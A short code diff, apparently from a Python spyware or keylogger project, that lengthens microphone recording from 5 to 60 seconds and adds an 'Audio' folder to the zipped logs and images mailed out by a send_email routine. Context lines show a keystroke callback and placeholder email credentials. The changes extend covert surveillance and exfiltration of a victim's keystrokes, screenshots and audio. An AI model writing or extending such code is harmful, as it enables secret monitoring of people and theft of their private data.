@@ -16,7 +16,7 @@ FORMAT = pyaudio.paInt16
 CHANNELS = 1
 RATE = 44100
 CHUNK = 1024
-RECORD_SECONDS = 5
+RECORD_SECONDS = 60
 
 p = pyaudio.PyAudio()
 
@@ -70,7 +70,7 @@ def callback_function(key):
 def send_email(message):
         
     sender_email = "yourmail@example.com"
-    sender_password = "yourpassword"
+    sender_password = "your password"
 
     receiver_email = "yourmail@example.com"
 
@@ -104,7 +104,7 @@ def send_email(message):
 
 def thread_function():
     global zip_counter
-    folders=["Images","Logs"]
+    folders=["Images","Logs","Audio"]
     zip_name=f"Rar Files\\Log{zip_counter}.zip"
     zip_counter +=1
     convert_zip(folders,zip_name)
